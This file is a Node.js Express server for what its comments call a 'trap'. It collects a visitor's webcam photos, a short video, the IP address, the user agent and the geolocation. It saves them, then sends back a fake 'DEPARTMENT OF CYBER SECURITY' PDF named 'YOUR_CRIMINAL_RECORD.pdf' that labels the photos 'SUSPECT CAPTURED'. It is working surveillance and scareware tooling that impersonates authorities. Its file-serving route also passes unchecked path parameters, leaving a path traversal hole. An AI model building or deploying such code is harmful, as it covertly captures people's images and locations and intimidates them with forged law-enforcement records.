// SERVER.JS - PHOTOS + SEQUENTIAL VIDEO EVIDENCE

const express = require('express');
const bodyParser = require('body-parser');
const PDFDocument = require('pdfkit');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());

// Set High Limit for Video Upload (100mb is plenty for 5s video)
app.use(bodyParser.json({ limit: '100mb' }));

// Serve frontend files from /public
app.use(express.static(path.join(__dirname, 'public')));

// Create the main folder for evidence
const CAPTURE_DIR = path.join(__dirname, 'captures');
if (!fs.existsSync(CAPTURE_DIR)) {
  fs.mkdirSync(CAPTURE_DIR);
}

// --- ROUTES ---

// 1. Serve the Frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});


// 2. Handle the Trap Data
app.post('/api/report', async (req, res) => {
  try {
    console.log('1. Receiving Evidence (Photos + Video)...');

    // Destructure data from the body
    const { images, video, meta } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Create Timestamped Folder
    const timestamp = new Date().getTime();
    const caseId = `CASE_${timestamp}`;
    const sessionDir = path.join(CAPTURE_DIR, caseId);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

    // --- A. SAVE VIDEO EVIDENCE ---
    if (video) {
      try {
        const videoData = video.split(';base64,').pop();
        const videoBuffer = Buffer.from(videoData, 'base64');
        const videoPath = path.join(sessionDir, 'evidence_video.webm');
        fs.writeFileSync(videoPath, videoBuffer);
        console.log(`-> Video saved: ${videoPath}`);
      } catch (e) {
        console.error('Video save error:', e.message);
      }
    }

    // --- B. GENERATE PDF DOSSIER ---
    const doc = new PDFDocument({ margin: 50 });
    let buffers = [];
    doc.on('data', buffers.push.bind(buffers));

    // Header
    doc.font('Courier-Bold').fontSize(24).text('DEPARTMENT OF CYBER SECURITY', { align: 'center' });
    doc.fontSize(10).text('INTERNAL INVESTIGATION DIVISION', { align: 'center' });
    doc.moveDown();
    doc.lineWidth(2).moveTo(50, doc.y).lineTo(550, doc.y).stroke();

    // Stamp
    doc.save();
    doc.rotate(-10, { origin: [100, 150] });
    doc.fontSize(30).fillColor('red').opacity(0.5).text('CONFIDENTIAL / CLASSIFIED', 50, 150);
    doc.restore();

    // Details
    doc.moveDown(2);
    doc.font('Courier-Bold').fontSize(14).fillColor('black').text('// CASE FILE DETAILS', { underline: true });
    doc.font('Courier').fontSize(12);
    doc.text(`CASE ID: #${timestamp}`);
    doc.text(`DATE: ${new Date().toLocaleString()}`);
    doc.text(`IP ADDRESS: ${clientIP}`);
    doc.text(`PLATFORM: ${meta && meta.userAgent}`);

    if (meta && meta.location) {
      doc.text(`LOCATION: ${meta.location.lat}, ${meta.location.lon}`);
      doc.fillColor('blue').text('VIEW ON GOOGLE MAPS', {
        link: `https://www.google.com/maps?q=${meta.location.lat},${meta.location.lon}`,
        underline: true
      });
      doc.fillColor('black');
    } else {
      doc.fillColor('red').text('LOCATION: TRACKING DENIED (SUSPICIOUS ACTIVITY)');
      doc.fillColor('black');
    }

    if (video) {
      doc.moveDown();
      doc.fillColor('red').text('[!] 5-SECOND VIDEO RECORDING CAPTURED AND FILED.', { align: 'left' });
      doc.fillColor('black');
    }

    // Photos
    doc.moveDown(2);
    doc.font('Courier-Bold').fontSize(14).text('// PHOTOGRAPHIC EVIDENCE', { underline: true });
    doc.moveDown();

    if (images && images.length > 0) {
      images.forEach((base64String, index) => {
        try {
          const imgData = base64String.split(';base64,').pop();
          const imgBuffer = Buffer.from(imgData, 'base64');

          // Save individual photo
          const imgFileName = `evidence_${index + 1}.jpg`;
          fs.writeFileSync(path.join(sessionDir, imgFileName), imgBuffer);

          // Add to PDF
          doc.rect(100, doc.y - 5, 410, 310).stroke();
          doc.image(imgBuffer, 105, doc.y, { width: 400, height: 300, fit: [400, 300] });
          doc.moveDown();
          doc.font('Courier').fontSize(10).text(`EXHIBIT #${index + 1} // SUSPECT CAPTURED`, { align: 'center' });
          doc.moveDown(2);
        } catch (e) {
          console.log('Error processing image:', e.message);
        }
      });
    }

    doc.end();

    // --- C. FINALIZE & SEND BACK ---
    doc.on('end', () => {
      const pdfData = Buffer.concat(buffers);

      const pdfPath = path.join(sessionDir, 'Criminal_Record.pdf');
      fs.writeFileSync(pdfPath, pdfData);
      console.log(`2. Evidence saved to: ${pdfPath}`);

      console.log('3. Redirecting suspect to the dossier...');
      res.setHeader('Content-Type', 'application/pdf');
      res.setHeader('Content-Disposition', 'inline; filename="YOUR_CRIMINAL_RECORD.pdf"');
      res.send(pdfData);
    });
  } catch (error) {
    console.error('[ERROR]', error);
    res.status(500).json({ error: error.message });
  }
});

// 3. View saved capture files (video, images, PDF)
app.get('/captures/:caseId/:fileName', (req, res) => {
  const { caseId, fileName } = req.params;
  const filePath = path.join(CAPTURE_DIR, caseId, fileName);
  res.sendFile(filePath, err => {
    if (err) {
      console.error('File send error:', err.message);
      res.status(404).send('File not found');
    }
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Files will be saved in: ${CAPTURE_DIR}`);
});
